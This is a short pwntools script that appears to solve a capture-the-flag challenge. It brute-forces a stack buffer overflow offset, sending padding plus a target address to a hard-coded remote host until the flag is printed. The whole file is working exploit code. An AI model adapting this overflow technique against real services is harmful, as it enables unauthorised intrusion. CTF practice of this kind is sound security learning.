from pwn import *

flag_addr = 0x404040
print(f"[*] g_flag address: {hex(flag_addr)}")

context.log_level = "error"

for offset in range(300, 500, 4):
    print(f"[*] Trying offset: {offset:3} bytes ...", end=" ", flush=True)
    try:
        p = remote("34.170.146.252", 19608)
        payload = b"A" * offset
        payload += p64(flag_addr)
        p.recvuntil(b"Password: ", timeout=1)
        p.sendline(payload)
        result = p.recvall(timeout=1).decode(errors="ignore")
        if "Alpaca{" in result or "alpaca{" in result.lower():
            print("\n🎯 Success!! (FLAG Found!)")
            print("=" * 40)
            print(f"🎉 成功したオフセット: {offset}")
            print("=" * 40)
            print(result.strip())
            print("=" * 40 + "\n")
            p.close()
            break
        else:
            print("Failed.")
        p.close()
        time.sleep(1)
    except Exception as e:
        print(f"Error! ({e})")
        if "p" in locals():
            p.close()
